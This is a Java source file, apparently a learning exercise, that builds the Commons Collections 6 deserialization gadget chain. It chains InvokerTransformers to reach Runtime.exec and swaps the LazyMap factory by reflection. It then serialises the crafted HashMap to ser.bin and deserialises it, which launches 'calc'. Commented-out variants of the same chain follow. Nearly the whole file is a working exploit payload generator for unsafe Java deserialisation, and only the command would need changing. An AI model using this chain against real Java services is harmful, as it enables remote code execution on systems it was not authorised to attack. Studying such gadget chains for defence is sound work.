import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.rmi.CORBA.Tie;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class demo2 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformer = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})

        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);
        HashMap<Object,Object> hash = new HashMap<Object, Object>();
        Map<Object,Object> lazymap = LazyMap.decorate(hash,new ConstantTransformer(1));

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,"aaa");

        HashMap<Object,Object> hashMap = new HashMap<Object, Object>();
        hashMap.put(tiedMapEntry,"bbb");

        lazymap.remove("aaa");

        Class c = LazyMap.class;
        Field factory = c.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazymap,chainedTransformer);

        serialize(hashMap);
        unserialize("ser.bin");

//        Map<Object,Object> lazymap = LazyMap.decorate(hash,chainedTransformer);
//
//        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,"aaa");
//        HashMap<Object,Object> hashMap = new HashMap<Object, Object>();
//        hashMap.put(tiedMapEntry,"bbb");
        //serialize(hashMap);
        //unserialize("ser.bin");



//        serialize(hashMap);
//        unserialize(hashMap);


//        Transformer[] transformer = new Transformer[]{
//                new ConstantTransformer(Runtime.class),
//                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
//                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
//                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
//
//        };
//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);
////        Runtime runtime = Runtime.getRuntime();
////        InvokerTransformer invoke = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
//        Map<Object,Object> hash = new HashMap<Object, Object>();
//        Map decorate = LazyMap.decorate(hash, new ConstantTransformer(1));
//        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,"a");
////        tiedMapEntry.hashCode();
//        Map<Object, Object> map = new HashMap<Object,Object>();
//        map.put(tiedMapEntry,"bbb");
//        decorate.remove("a");
//        Field factory = LazyMap.class.getDeclaredField("factory");
//        factory.setAccessible(true);
//        factory.set(decorate,chainedTransformer);
////        serialize(map);
//        unserialize("ser.bin");

    }
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }


}
